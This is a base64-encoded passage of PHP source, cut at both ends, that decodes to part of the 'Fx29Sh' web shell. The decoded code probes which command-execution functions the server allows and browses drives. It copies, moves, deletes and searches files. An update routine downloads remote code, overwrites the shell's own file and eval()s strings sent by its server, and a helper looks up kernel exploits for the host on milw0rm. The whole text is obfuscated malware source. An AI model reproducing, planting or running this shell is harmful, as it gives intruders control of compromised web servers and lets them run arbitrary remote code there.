OyB9CiAgICBlbHNlIHsgJHN0YXRpbmZvW10gPSBzaG93c3RhdCgkZnVuY1swXSwib2ZmIik7IH0KICB9CiAgJHN0YXRpbmZvW10gPSAoQGV4dGVuc2lvbl9sb2FkZWQoJ3NvY2tldHMnKSk/c2hvd3N0YXQoIlNvY2tldHMiLCJvbiIpOnNob3dzdGF0KCJTb2NrZXRzIiwib2ZmIik7CiAgZm9yZWFjaCAoJGFycmNtZCBhcyAkY21kKSB7CiAgICBpZiAoZngyOWV4ZWMyKCRjbWRbMV0pKSB7ICRzdGF0aW5mb1tdID0gc2hvd3N0YXQoJGNtZFswXSwib24iKTsgfQogICAgZWxzZSB7ICRzdGF0aW5mb1tdID0gc2hvd3N0YXQoJGNtZFswXSwib2ZmIik7IH0KICB9CiAgcmV0dXJuIGltcGxvZGUoIiAiLCRzdGF0aW5mbyk7Cn0KZnVuY3Rpb24gc2hvd2Rpc2Z1bmMoKSB7CiAgaWYgKCRkaXNhYmxlZnVuYyA9IEBpbmlfZ2V0KCJkaXNhYmxlX2Z1bmN0aW9ucyIpKSB7CiAgICByZXR1cm4gIjxmb250IGNvbG9yPSNGRjk5MDA+PGI+Ii4kZGlzYWJsZWZ1bmMuIjwvYj48L2ZvbnQ+IjsKICB9CiAgZWxzZSB7IHJldHVybiAiPGZvbnQgY29sb3I9IzAwRkYwMD48Yj5OT05FPC9iPjwvYj48L2ZvbnQ+IjsgfQp9CmZ1bmN0aW9uIGRpc3BfZHJpdmVzKCRjdXJkaXIsJHN1cmwpIHsKICAkbGV0dGVycyA9ICIiOwogICR2ID0gZXhwbG9kZSgiXFwiLCRjdXJkaXIpOwogICR2ID0gJHZbMF07CiAgZm9yZWFjaCAocmFuZ2UoIkEiLCJaIikgYXMgJGxldHRlcikgewogICAgJGJvb2wgPSAkaXNkaXNrZXR0ZSA9ICRsZXR0ZXIgPT0gIkEiOwogICAgaWYgKCEkYm9vbCkgeyAkYm9vbCA9IGlzX2RpcigkbGV0dGVyLiI6XFwiKTsgfQogICAgaWYgKCRib29sKSB7CiAgICAgICRsZXR0ZXJzIC49ICI8YSBocmVmPVwiIi4kc3VybC4iYWN0PWxzJmQ9Ii51cmxlbmNvZGUoJGxldHRlci4iOlxcIikuIlwiIi4KICAgICAgICAgICAgICAgICAgKCRpc2Rpc2tldHRlPyIgb25jbGljaz1cInJldHVybiBjb25maXJtKCdNYWtlIHN1cmUgdGhhdCB0aGUgZGlza2V0dGUgaXMgaW5zZXJ0ZWQgcHJvcGVybHkhJylcIiI6IiIpLiI+ICI7CiAgICAgIGlmICgkbGV0dGVyLiI6IiAhPSAkdikgeyAkbGV0dGVycyAuPSAkbGV0dGVyOyB9CiAgICAgIGVsc2UgeyAkbGV0dGVycyAuPSAiPGZvbnQgY29sb3I9eWVsbG93PiIuJGxldHRlci4iPC9mb250PiI7IH0KICAgICAgJGxldHRlcnMgLj0gIjwvYT4gIjsKICAgIH0KICB9CiAgaWYgKCFlbXB0eSgkbGV0dGVycykpIHsgUmV0dXJuICRsZXR0ZXJzOyB9CiAgZWxzZSAge1JldHVybiAiTm9uZSI7IH0KfQpmdW5jdGlvbiBkaXNwX2ZyZWVzcGFjZSgkY3VyZHJ2KSB7CiAgJGZyZWUgPSBAZGlza19mcmVlX3NwYWNlKCRjdXJkcnYpOwogICR0b3RhbCA9IEBkaXNrX3RvdGFsX3NwYWNlKCRjdXJkcnYpOwogIGlmICgkZnJlZSA9PT0gRkFMU0UpIHsgJGZyZWUgPSAwOyB9CiAgaWYgKCR0b3RhbCA9PT0gRkFMU0UpIHsgJHRvdGFsID0gMDsgfQogIGlmICgkZnJlZSA8IDApIHsgJGZyZWUgPSAwOyB9CiAgaWYgKCR0b3RhbCA8IDApIHsgJHRvdGFsID0gMDsgfQogICR1c2VkID0gJHRvdGFsLSRmcmVlOwogICRmcmVlX3BlcmNlbnQgPSByb3VuZCgxMDAvKCR0b3RhbC8kZnJlZSksMikuIiUiOwogICRmcmVlID0gdmlld19zaXplKCRmcmVlKTsKICAkdG90YWwgPSB2aWV3X3NpemUoJHRvdGFsKTsKICByZXR1cm4gIiRmcmVlIG9mICR0b3RhbCAoJGZyZWVfcGVyY2VudCkiOwp9CiMjIEZ4MjlTaCBVUERBVEUgRlVOQ1RJT05TICMjCmZ1bmN0aW9uIGZ4MjlnZXRzb3VyY2UoJGZuKSB7CiAgZ2xvYmFsICRmeDI5c2hfc291cmNlc3VybDsKICAkYXJyYXkgPSBhcnJheSgKICAgICJmeDI5c2gucGhwIiA9PiAiZngyOXNoLnR4dCIsCiAgKTsKICAkbmFtZSA9ICRhcnJheVskZm5dOwogIGlmICgkbmFtZSkge3JldHVybiBmaWxlX2dldF9jb250ZW50cygkZngyOXNoX3NvdXJjZXN1cmwuJG5hbWUpO30KICBlbHNlIHtyZXR1cm4gRkFMU0U7fQp9CmZ1bmN0aW9uIGZ4MjlzaF9nZXR1cGRhdGUoJHVwZGF0ZSA9IFRSVUUpIHsKICAkdXJsID0gJEdMT0JBTFNbImZ4MjlzaF91cGRhdGV1cmwiXS4iP3ZlcnNpb249Ii51cmxlbmNvZGUoYmFzZTY0X2VuY29kZSgkR0xPQkFMU1sic2hfdmVyIl0pKS4iJnVwZGF0ZW5vdz0iLigkdXBkYXRlbm93PyIxIjoiMCIpOwogICRkYXRhID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwpOwogIGlmICghJGRhdGEpIHsgcmV0dXJuICJDYW4ndCBjb25uZWN0IHRvIHVwZGF0ZS1zZXJ2ZXIhIjsgfQogIGVsc2UgewogICAgJGRhdGEgPSBsdHJpbSgkZGF0YSk7CiAgICAkc3RyaW5nID0gc3Vic3RyKCRkYXRhLDMsb3JkKCRkYXRhezJ9KSk7CiAgICBpZiAoJGRhdGF7MH0gPT0gIlx4OTkiIGFuZCAkZGF0YXsxfSA9PSAiXHgwMSIpIHtyZXR1cm4gIkVycm9yOiAiLiRzdHJpbmc7IHJldHVybiBGQUxTRTt9CiAgICBpZiAoJGRhdGF7MH0gPT0gIlx4OTkiIGFuZCAkZGF0YXsxfSA9PSAiXHgwMiIpIHtyZXR1cm4gIllvdSBhcmUgdXNpbmcgbGF0ZXN0IHZlcnNpb24hIjt9CiAgICBpZiAoJGRhdGF7MH0gPT0gIlx4OTkiIGFuZCAkZGF0YXsxfSA9PSAiXHgwMyIpIHsKICAgICAgJHN0cmluZyA9IGV4cGxvZGUoInwiLCRzdHJpbmcpOwogICAgICBpZiAoJHVwZGF0ZSkgewogICAgICAgICRjb25mdmFycyA9IGFycmF5KCk7CiAgICAgICAgJHNvdXJjZXVybCA9ICRzdHJpbmdbMF07CiAgICAgICAgJHNvdXJjZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRzb3VyY2V1cmwpOwogICAgICAgIGlmICghJHNvdXJjZSkge3JldHVybiAiQ2FuJ3QgZmV0Y2ggdXBkYXRlISI7fQogICAgICAgIGVsc2UgewogICAgICAgICAgJGZwID0gZm9wZW4oX19GSUxFX18sInciKTsKICAgICAgICAgIGlmICghJGZwKSB7cmV0dXJuICJMb2NhbCBlcnJvcjogY2FuJ3Qgd3JpdGUgdXBkYXRlIHRvICIuX19GSUxFX18uIiEgWW91IG1heSBkb3dubG9hZCBmeDI5c2hlbGwucGhwIG1hbnVhbGx5IDxhIGhyZWY9XCIiLiRzb3VyY2V1cmwuIlwiPjx1PmhlcmU8L3U+PC9hPi4iO30KICAgICAgICAgIGVsc2UgewogICAgICAgICAgICBmd3JpdGUoJGZwLCRzb3VyY2UpOwogICAgICAgICAgICBmY2xvc2UoJGZwKTsKICAgICAgICAgICAgcmV0dXJuICJVcGRhdGUgY29tcGxldGVkISI7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICB9CiAgICAgIGVsc2Uge3JldHVybiAiTmV3IHZlcnNpb24gYXJlIGF2YWlsYWJsZTogIi4kc3RyaW5nWzFdO30KICAgIH0KICAgIGVsc2VpZiAoJGRhdGF7MH0gPT0gIlx4OTkiIGFuZCAkZGF0YXsxfSA9PSAiXHgwNCIpIHsKICAgICAgZXZhbCgkc3RyaW5nKTsKICAgICAgcmV0dXJuIDE7CiAgICB9CiAgICBlbHNlIHtyZXR1cm4gIkVycm9yIGluIHByb3RvY29sOiBzZWdtZW50YXRpb24gZmFpbGVkISAoIi4kZGF0YS4iKSAiO30KICB9Cn0KZnVuY3Rpb24gZngyOV9idWZmX3ByZXBhcmUoKSB7CiAgZ2xvYmFsICRzZXNzX2RhdGE7CiAgZ2xvYmFsICRhY3Q7CiAgZm9yZWFjaCgkc2Vzc19kYXRhWyJjb3B5Il0gYXMgJGs9PiR2KSB7JHNlc3NfZGF0YVsiY29weSJdWyRrXSA9IHN0cl9yZXBsYWNlKCJcXCIsRElSRUNUT1JZX1NFUEFSQVRPUixyZWFscGF0aCgkdikpO30KICBmb3JlYWNoKCRzZXNzX2RhdGFbImN1dCJdIGFzICRrPT4kdikgeyRzZXNzX2RhdGFbImN1dCJdWyRrXSA9IHN0cl9yZXBsYWNlKCJcXCIsRElSRUNUT1JZX1NFUEFSQVRPUixyZWFscGF0aCgkdikpO30KICAkc2Vzc19kYXRhWyJjb3B5Il0gPSBhcnJheV91bmlxdWUoJHNlc3NfZGF0YVsiY29weSJdKTsKICAkc2Vzc19kYXRhWyJjdXQiXSA9IGFycmF5X3VuaXF1ZSgkc2Vzc19kYXRhWyJjdXQiXSk7CiAgc29ydCgkc2Vzc19kYXRhWyJjb3B5Il0pOwogIHNvcnQoJHNlc3NfZGF0YVsiY3V0Il0pOwogIGlmICgkYWN0ICE9ICJjb3B5Iikge2ZvcmVhY2goJHNlc3NfZGF0YVsiY3V0Il0gYXMgJGs9PiR2KSB7aWYgKCRzZXNzX2RhdGFbImNvcHkiXVska10gPT0gJHYpIHt1bnNldCgkc2Vzc19kYXRhWyJjb3B5Il1bJGtdKTsgfX19CiAgZWxzZSB7Zm9yZWFjaCgkc2Vzc19kYXRhWyJjb3B5Il0gYXMgJGs9PiR2KSB7aWYgKCRzZXNzX2RhdGFbImN1dCJdWyRrXSA9PSAkdikge3Vuc2V0KCRzZXNzX2RhdGFbImN1dCJdWyRrXSk7fX19Cn0KZnVuY3Rpb24gZngyOV9zZXNzX3B1dCgkZGF0YSkgewogIGdsb2JhbCAkc2Vzc19jb29raWU7CiAgZ2xvYmFsICRzZXNzX2RhdGE7CiAgZngyOV9idWZmX3ByZXBhcmUoKTsKICAkc2Vzc19kYXRhID0gJGRhdGE7CiAgJGRhdGEgPSBzZXJpYWxpemUoJGRhdGEpOwogIHNldGNvb2tpZSgkc2Vzc19jb29raWUsJGRhdGEpOwp9CiMjIEVORCBGeDI5U2ggVVBEQVRFIEZVTkNUSU9OUyAjIwojIyBGSUxFU1lTVEVNIEZVTkNUSU9OUyAjIwpmdW5jdGlvbiBmc19jb3B5X2RpcigkZCwkdCkgewogICRkID0gc3RyX3JlcGxhY2UoIlxcIixESVJFQ1RPUllfU0VQQVJBVE9SLCRkKTsKICBpZiAoc3Vic3RyKCRkLC0xKSAhPSBESVJFQ1RPUllfU0VQQVJBVE9SKSB7JGQgLj0gRElSRUNUT1JZX1NFUEFSQVRPUjt9CiAgJGggPSBvcGVuZGlyKCRkKTsKICB3aGlsZSAoKCRvID0gcmVhZGRpcigkaCkpICE9PSBGQUxTRSkgewogICAgaWYgKCgkbyAhPSAiLiIpIGFuZCAoJG8gIT0gIi4uIikpIHsKICAgICAgaWYgKCFpc19kaXIoJGQuRElSRUNUT1JZX1NFUEFSQVRPUi4kbykpIHskcmV0ID0gY29weSgkZC5ESVJFQ1RPUllfU0VQQVJBVE9SLiRvLCR0LkRJUkVDVE9SWV9TRVBBUkFUT1IuJG8pO30KICAgICAgZWxzZSB7JHJldCA9IG1rZGlyKCR0LkRJUkVDVE9SWV9TRVBBUkFUT1IuJG8pOyBmc19jb3B5X2RpcigkZC5ESVJFQ1RPUllfU0VQQVJBVE9SLiRvLCR0LkRJUkVDVE9SWV9TRVBBUkFUT1IuJG8pO30KICAgICAgaWYgKCEkcmV0KSB7cmV0dXJuICRyZXQ7fQogICAgfQogIH0KICBjbG9zZWRpcigkaCk7CiAgcmV0dXJuIFRSVUU7Cn0KZnVuY3Rpb24gZnNfY29weV9vYmooJGQsJHQpIHsKICAkZCA9IHN0cl9yZXBsYWNlKCJcXCIsRElSRUNUT1JZX1NFUEFSQVRPUiwkZCk7CiAgJHQgPSBzdHJfcmVwbGFjZSgiXFwiLERJUkVDVE9SWV9TRVBBUkFUT1IsJHQpOwogIGlmICghaXNfZGlyKGRpcm5hbWUoJHQpKSkge21rZGlyKGRpcm5hbWUoJHQpKTt9CiAgaWYgKGlzX2RpcigkZCkpIHsKICAgIGlmIChzdWJzdHIoJGQsLTEpICE9IERJUkVDVE9SWV9TRVBBUkFUT1IpIHskZCAuPSBESVJFQ1RPUllfU0VQQVJBVE9SO30KICAgIGlmIChzdWJzdHIoJHQsLTEpICE9IERJUkVDVE9SWV9TRVBBUkFUT1IpIHskdCAuPSBESVJFQ1RPUllfU0VQQVJBVE9SO30KICAgIHJldHVybiBmc19jb3B5X2RpcigkZCwkdCk7CiAgfQogIGVsc2VpZiAoaXNfZmlsZSgkZCkpIHsgcmV0dXJuIGNvcHkoJGQsJHQpOyB9CiAgZWxzZSB7IHJldHVybiBGQUxTRTsgfQp9CmZ1bmN0aW9uIGZzX21vdmVfZGlyKCRkLCR0KSB7CiAgJGggPSBvcGVuZGlyKCRkKTsKICBpZiAoIWlzX2RpcigkdCkpIHtta2RpcigkdCk7fQogIHdoaWxlICgoJG8gPSByZWFkZGlyKCRoKSkgIT09IEZBTFNFKSB7CiAgICBpZiAoKCRvICE9ICIuIikgYW5kICgkbyAhPSAiLi4iKSkgewogICAgICAkcmV0ID0gVFJVRTsKICAgICAgaWYgKCFpc19kaXIoJGQuRElSRUNUT1JZX1NFUEFSQVRPUi4kbykpIHskcmV0ID0gY29weSgkZC5ESVJFQ1RPUllfU0VQQVJBVE9SLiRvLCR0LkRJUkVDVE9SWV9TRVBBUkFUT1IuJG8pO30KICAgICAgZWxzZSB7aWYgKG1rZGlyKCR0LkRJUkVDVE9SWV9TRVBBUkFUT1IuJG8pIGFuZCBmc19jb3B5X2RpcigkZC5ESVJFQ1RPUllfU0VQQVJBVE9SLiRvLCR0LkRJUkVDVE9SWV9TRVBBUkFUT1IuJG8pKSB7JHJldCA9IEZBTFNFO319CiAgICAgIGlmICghJHJldCkge3JldHVybiAkcmV0O30KICAgICB9CiAgIH0KICBjbG9zZWRpcigkaCk7CiAgcmV0dXJuIFRSVUU7Cn0KZnVuY3Rpb24gZnNfbW92ZV9vYmooJGQsJHQpIHsKICAkZCA9IHN0cl9yZXBsYWNlKCJcXCIsRElSRUNUT1JZX1NFUEFSQVRPUiwkZCk7CiAgJHQgPSBzdHJfcmVwbGFjZSgiXFwiLERJUkVDVE9SWV9TRVBBUkFUT1IsJHQpOwogIGlmIChpc19kaXIoJGQpKSB7CiAgICBpZiAoc3Vic3RyKCRkLC0xKSAhPSBESVJFQ1RPUllfU0VQQVJBVE9SKSB7JGQgLj0gRElSRUNUT1JZX1NFUEFSQVRPUjt9CiAgICBpZiAoc3Vic3RyKCR0LC0xKSAhPSBESVJFQ1RPUllfU0VQQVJBVE9SKSB7JHQgLj0gRElSRUNUT1JZX1NFUEFSQVRPUjt9CiAgICByZXR1cm4gZnNfbW92ZV9kaXIoJGQsJHQpOwogIH0KICBlbHNlaWYgKGlzX2ZpbGUoJGQpKSB7CiAgICBpZihjb3B5KCRkLCR0KSkge3JldHVybiB1bmxpbmsoJGQpO30KICAgIGVsc2Uge3VubGluaygkdCk7IHJldHVybiBGQUxTRTt9CiAgfQogIGVsc2Uge3JldHVybiBGQUxTRTt9Cn0KZnVuY3Rpb24gZnNfcm1kaXIoJGQpIHsKICAkaCA9IG9wZW5kaXIoJGQpOwogIHdoaWxlICgoJG8gPSByZWFkZGlyKCRoKSkgIT09IEZBTFNFKSB7CiAgICBpZiAoKCRvICE9ICIuIikgYW5kICgkbyAhPSAiLi4iKSkgewogICAgICBpZiAoIWlzX2RpcigkZC4kbykpIHt1bmxpbmsoJGQuJG8pO30KICAgICAgZWxzZSB7ZnNfcm1kaXIoJGQuJG8uRElSRUNUT1JZX1NFUEFSQVRPUik7IHJtZGlyKCRkLiRvKTt9CiAgICB9CiAgfQogIGNsb3NlZGlyKCRoKTsKICBybWRpcigkZCk7CiAgcmV0dXJuICFpc19kaXIoJGQpOwp9CmZ1bmN0aW9uIGZzX3Jtb2JqKCRvKSB7CiAgJG8gPSBzdHJfcmVwbGFjZSgiXFwiLERJUkVDVE9SWV9TRVBBUkFUT1IsJG8pOwogIGlmIChpc19kaXIoJG8pKSB7CiAgICBpZiAoc3Vic3RyKCRvLC0xKSAhPSBESVJFQ1RPUllfU0VQQVJBVE9SKSB7JG8gLj0gRElSRUNUT1JZX1NFUEFSQVRPUjt9CiAgICByZXR1cm4gZnNfcm1kaXIoJG8pOwogIH0KICBlbHNlaWYgKGlzX2ZpbGUoJG8pKSB7cmV0dXJuIHVubGluaygkbyk7fQogIGVsc2Uge3JldHVybiBGQUxTRTt9Cn0KIyMgRU5EIEZJTEVTWVNURU0gRlVOQ1RJT05TICMjCmZ1bmN0aW9uIG9ucGhwc2h1dGRvd24oKSB7CiAgZ2xvYmFsICRnemlwZW5jb2RlLCRmdDsKICBpZiAoIWhlYWRlcnNfc2VudCgpIGFuZCAkZ3ppcGVuY29kZSBhbmQgIWluX2FycmF5KCRmdCxhcnJheSgiaW1nIiwiZG93bmxvYWQiLCJub3RlcGFkIikpKSB7CiAgICAkdiA9IEBvYl9nZXRfY29udGVudHMoKTsKICAgIEBvYl9lbmRfY2xlYW4oKTsKICAgIEBvYl9zdGFydCgib2JfZ3pIYW5kbGVyIik7CiAgICBlY2hvICR2OwogICAgQG9iX2VuZF9mbHVzaCgpOwogIH0KfQpmdW5jdGlvbiBmeDI5c2hleGl0KCkgeyBvbnBocHNodXRkb3duKCk7IGV4aXQ7IH0KCmZ1bmN0aW9uIGZ4Mjlmc2VhcmNoKCRkKSB7CiAgZ2xvYmFsICRmb3VuZCwgJGZvdW5kX2QsICRmb3VuZF9mLCAkc2VhcmNoX2lfZiwgJHNlYXJjaF9pX2QsICRhOwogIGlmIChzdWJzdHIoJGQsLTEpICE9IERJUkVDVE9SWV9TRVBBUkFUT1IpIHskZCAuPSBESVJFQ1RPUllfU0VQQVJBVE9SO30KICAkaCA9IG9wZW5kaXIoJGQpOwogIHdoaWxlICgoJGYgPSByZWFkZGlyKCRoKSkgIT09IEZBTFNFKSB7CiAgICBpZigkZiAhPSAiLiIgJiYgJGYgIT0gIi4uIikgewogICAgICAkYm9vbCA9IChlbXB0eSgkYVsibmFtZV9yZWdleHAiXSkgYW5kIHN0cnBvcygkZiwkYVsibmFtZSJdKSAhPT0gRkFMU0UpIHx8ICgkYVsibmFtZV9yZWdleHAiXSBhbmQgZXJlZygkYVsibmFtZSJdLCRmKSk7CiAgICAgIGlmIChpc19kaXIoJGQuJGYpKSB7CiAgICAgICAgJHNlYXJjaF9pX2QrKzsKICAgICAgICBpZiAoZW1wdHkoJGFbInRleHQiXSkgYW5kICRib29sKSB7JGZvdW5kW10gPSAkZC4kZjsgJGZvdW5kX2QrKzt9CiAgICAgICAgaWYgKCFpc19saW5rKCRkLiRmKSkge2Z4Mjlmc2VhcmNoKCRkLiRmKTt9CiAgICAgIH0KICAgICAgZWxzZSB7CiAgICAgICAgJHNlYXJjaF9pX2YrKzsKICAgICAgICBpZiAoJGJvb2wpIHsKICAgICAgICAgIGlmICghZW1wdHkoJGFbInRleHQiXSkpIHsKICAgICAgICAgICAgJHIgPSBAZmlsZV9nZXRfY29udGVudHMoJGQuJGYpOwogICAgICAgICAgICBpZiAoJGFbInRleHRfd3dvIl0pIHskYVsidGV4dCJdID0gIiAiLnRyaW0oJGFbInRleHQiXSkuIiAiO30KICAgICAgICAgICAgaWYgKCEkYVsidGV4dF9jcyJdKSB7JGFbInRleHQiXSA9IHN0cnRvbG93ZXIoJGFbInRleHQiXSk7ICRyID0gc3RydG9sb3dlcigkcik7fQogICAgICAgICAgICBpZiAoJGFbInRleHRfcmVnZXhwIl0pIHskYm9vbCA9IGVyZWcoJGFbInRleHQiXSwkcik7fQogICAgICAgICAgICBlbHNlIHskYm9vbCA9IHN0cnBvcygiICIuJHIsJGFbInRleHQiXSwxKTt9CiAgICAgICAgICAgIGlmICgkYVsidGV4dF9ub3QiXSkgeyRib29sID0gISRib29sO30KICAgICAgICAgICAgaWYgKCRib29sKSB7JGZvdW5kW10gPSAkZC4kZjsgJGZvdW5kX2YrKzt9CiAgICAgICAgICB9CiAgICAgICAgICBlbHNlIHskZm91bmRbXSA9ICRkLiRmOyAkZm91bmRfZisrO30KICAgICAgICB9CiAgICAgIH0KICAgIH0KICB9CiAgY2xvc2VkaXIoJGgpOwp9CmZ1bmN0aW9uIHZpZXdfc2l6ZSgkc2l6ZSkgewogIGlmICghaXNfbnVtZXJpYygkc2l6ZSkpIHsgcmV0dXJuIEZBTFNFOyB9CiAgZWxzZSB7CiAgICBpZiAoJHNpemUgPj0gMTA3Mzc0MTgyNCkgeyRzaXplID0gcm91bmQoJHNpemUvMTA3Mzc0MTgyNCoxMDApLzEwMCAuIiBHQiI7fQogICAgZWxzZWlmICgkc2l6ZSA+PSAxMDQ4NTc2KSB7JHNpemUgPSByb3VuZCgkc2l6ZS8xMDQ4NTc2KjEwMCkvMTAwIC4iIE1CIjt9CiAgICBlbHNlaWYgKCRzaXplID49IDEwMjQpIHskc2l6ZSA9IHJvdW5kKCRzaXplLzEwMjQqMTAwKS8xMDAgLiIgS0IiO30KICAgIGVsc2UgeyRzaXplID0gJHNpemUgLiAiIEIiO30KICAgIHJldHVybiAkc2l6ZTsKICB9Cn0KZnVuY3Rpb24gdGFic29ydCgkYSwkYikgeyBnbG9iYWwgJHY7IHJldHVybiBzdHJuYXRjbXAoJGFbJHZdLCAkYlskdl0pO30KZnVuY3Rpb24gdmlld19wZXJtcygkbW9kZSkgewogIGlmICgoJG1vZGUgJiAweEMwMDApID09PSAweEMwMDApIHskdHlwZSA9ICJzIjt9CiAgZWxzZWlmICgoJG1vZGUgJiAweDQwMDApID09PSAweDQwMDApIHskdHlwZSA9ICJkIjt9CiAgZWxzZWlmICgoJG1vZGUgJiAweEEwMDApID09PSAweEEwMDApIHskdHlwZSA9ICJsIjt9CiAgZWxzZWlmICgoJG1vZGUgJiAweDgwMDApID09PSAweDgwMDApIHskdHlwZSA9ICItIjt9CiAgZWxzZWlmICgoJG1vZGUgJiAweDYwMDApID09PSAweDYwMDApIHskdHlwZSA9ICJiIjt9CiAgZWxzZWlmICgoJG1vZGUgJiAweDIwMDApID09PSAweDIwMDApIHskdHlwZSA9ICJjIjt9CiAgZWxzZWlmICgoJG1vZGUgJiAweDEwMDApID09PSAweDEwMDApIHskdHlwZSA9ICJwIjt9CiAgZWxzZSB7JHR5cGUgPSAiPyI7fQogICRvd25lclsicmVhZCJdID0gKCRtb2RlICYgMDA0MDApPyJyIjoiLSI7CiAgJG93bmVyWyJ3cml0ZSJdID0gKCRtb2RlICYgMDAyMDApPyJ3IjoiLSI7CiAgJG93bmVyWyJleGVjdXRlIl0gPSAoJG1vZGUgJiAwMDEwMCk/IngiOiItIjsKICAkZ3JvdXBbInJlYWQiXSA9ICgkbW9kZSAmIDAwMDQwKT8iciI6Ii0iOwogICRncm91cFsid3JpdGUiXSA9ICgkbW9kZSAmIDAwMDIwKT8idyI6Ii0iOwogICRncm91cFsiZXhlY3V0ZSJdID0gKCRtb2RlICYgMDAwMTApPyJ4IjoiLSI7CiAgJHdvcmxkWyJyZWFkIl0gPSAoJG1vZGUgJiAwMDAwNCk/InIiOiItIjsKICAkd29ybGRbIndyaXRlIl0gPSAoJG1vZGUgJiAwMDAwMik/ICJ3IjoiLSI7CiAgJHdvcmxkWyJleGVjdXRlIl0gPSAoJG1vZGUgJiAwMDAwMSk/IngiOiItIjsKICBpZiAoJG1vZGUgJiAweDgwMCkgeyRvd25lclsiZXhlY3V0ZSJdID0gKCRvd25lclsiZXhlY3V0ZSJdID09ICJ4Iik/InMiOiJTIjt9CiAgaWYgKCRtb2RlICYgMHg0MDApIHskZ3JvdXBbImV4ZWN1dGUiXSA9ICgkZ3JvdXBbImV4ZWN1dGUiXSA9PSAieCIpPyJzIjoiUyI7fQogIGlmICgkbW9kZSAmIDB4MjAwKSB7JHdvcmxkWyJleGVjdXRlIl0gPSAoJHdvcmxkWyJleGVjdXRlIl0gPT0gIngiKT8idCI6IlQiO30KICByZXR1cm4gJHR5cGUuam9pbigiIiwkb3duZXIpLmpvaW4oIiIsJGdyb3VwKS5qb2luKCIiLCR3b3JsZCk7Cn0KZnVuY3Rpb24gcGFyc2VfcGVybXMoJG1vZGUpIHsKICBpZiAoKCRtb2RlICYgMHhDMDAwKSA9PT0gMHhDMDAwKSB7JHQgPSAicyI7fQogIGVsc2VpZiAoKCRtb2RlICYgMHg0MDAwKSA9PT0gMHg0MDAwKSB7JHQgPSAiZCI7fQogIGVsc2VpZiAoKCRtb2RlICYgMHhBMDAwKSA9PT0gMHhBMDAwKSB7JHQgPSAibCI7fQogIGVsc2VpZiAoKCRtb2RlICYgMHg4MDAwKSA9PT0gMHg4MDAwKSB7JHQgPSAiLSI7fQogIGVsc2VpZiAoKCRtb2RlICYgMHg2MDAwKSA9PT0gMHg2MDAwKSB7JHQgPSAiYiI7fQogIGVsc2VpZiAoKCRtb2RlICYgMHgyMDAwKSA9PT0gMHgyMDAwKSB7JHQgPSAiYyI7fQogIGVsc2VpZiAoKCRtb2RlICYgMHgxMDAwKSA9PT0gMHgxMDAwKSB7JHQgPSAicCI7fQogIGVsc2UgeyR0ID0gIj8iO30KICAkb1siciJdID0gKCRtb2RlICYgMDA0MDApID4gMDsgJG9bInciXSA9ICgkbW9kZSAmIDAwMjAwKSA+IDA7ICRvWyJ4Il0gPSAoJG1vZGUgJiAwMDEwMCkgPiAwOwogICRnWyJyIl0gPSAoJG1vZGUgJiAwMDA0MCkgPiAwOyAkZ1sidyJdID0gKCRtb2RlICYgMDAwMjApID4gMDsgJGdbIngiXSA9ICgkbW9kZSAmIDAwMDEwKSA+IDA7CiAgJHdbInIiXSA9ICgkbW9kZSAmIDAwMDA0KSA+IDA7ICR3WyJ3Il0gPSAoJG1vZGUgJiAwMDAwMikgPiAwOyAkd1sieCJdID0gKCRtb2RlICYgMDAwMDEpID4gMDsKICByZXR1cm4gYXJyYXkoInQiPT4kdCwibyI9PiRvLCJnIj0+JGcsInciPT4kdyk7Cn0KZnVuY3Rpb24gcGFyc2Vzb3J0KCRzb3J0KSB7CiAgJG9uZSA9IGludHZhbCgkc29ydCk7CiAgJHNlY29uZCA9IHN1YnN0cigkc29ydCwtMSk7CiAgaWYgKCRzZWNvbmQgIT0gImQiKSB7JHNlY29uZCA9ICJhIjt9CiAgcmV0dXJuIGFycmF5KCRvbmUsJHNlY29uZCk7Cn0KZnVuY3Rpb24gdmlld19wZXJtc19jb2xvcigkbykgewogIGlmICghaXNfcmVhZGFibGUoJG8pKSB7cmV0dXJuICI8Zm9udCBjb2xvcj1yZWQ+Ii52aWV3X3Blcm1zKGZpbGVwZXJtcygkbykpLiI8L2ZvbnQ+Ijt9CiAgZWxzZWlmICghaXNfd3JpdGFibGUoJG8pKSB7cmV0dXJuICI8Zm9udCBjb2xvcj13aGl0ZT4iLnZpZXdfcGVybXMoZmlsZXBlcm1zKCRvKSkuIjwvZm9udD4iO30KICBlbHNlIHtyZXR1cm4gIjxmb250IGNvbG9yPWdyZWVuPiIudmlld19wZXJtcyhmaWxlcGVybXMoJG8pKS4iPC9mb250PiI7fQp9CmZ1bmN0aW9uIHN0cjJtaW5pKCRjb250ZW50LCRsZW4pIHsKICBpZiAoc3RybGVuKCRjb250ZW50KSA+ICRsZW4pIHsKICAgICRsZW4gPSBjZWlsKCRsZW4vMikgLSAyOwogICAgcmV0dXJuIHN1YnN0cigkY29udGVudCwgMCwkbGVuKS4iLi4uIi5zdWJzdHIoJGNvbnRlbnQsLSRsZW4pOwogIH0gZWxzZSB7cmV0dXJuICRjb250ZW50O30KfQpmdW5jdGlvbiBzdHJpcHMoJiRhcnIsJGs9IiIpIHsKICBpZiAoaXNfYXJyYXkoJGFycikpIHsgZm9yZWFjaCgkYXJyIGFzICRrPT4kdikgeyBpZiAoc3RydG91cHBlcigkaykgIT0gIkdMT0JBTFMiKSB7IHN0cmlwcygkYXJyWyIkayJdKTsgfSB9IH0KICBlbHNlIHsgJGFyciA9IHN0cmlwc2xhc2hlcygkYXJyKTsgfQp9CgpmdW5jdGlvbiBnZXRtaWNyb3RpbWUoKSB7CiAgbGlzdCgkdXNlYywgJHNlYykgPSBleHBsb2RlKCIgIiwgbWljcm90aW1lKCkpOwogIHJldHVybiAoKGZsb2F0KSR1c2VjICsgKGZsb2F0KSRzZWMpOwp9CgpmdW5jdGlvbiBtaWx3MHJtKCkgewogICRMdmVyc2lvbiA9IHBocF91bmFtZShyKTsKICAkT1NWID0gcGhwX3VuYW1lKHMpOwogIGlmKGVyZWdpKCJMaW51eCIsJE9TVikpIHsKICAgICRMdmVyc2lvbiA9IHN1YnN0cigkTHZlcnNpb24sMCw2KTsKICAgIHJldHVybiAiaHR0cDovL21pbHcwcm0uY29tL3NlYXJjaC5waHA/ZG9uZz1MaW51eCBLZXJuZWwgIi4kTHZlcnNpb247CiAgfSBlbHNlIHsKICAgICRMdmVyc2lvbiA9IHN1YnN0cigkTHZlcnNpb24sMCwzKTsKICAgIHJldHVybiAiaHR0cDovL21pbHcwcm0uY29tL3N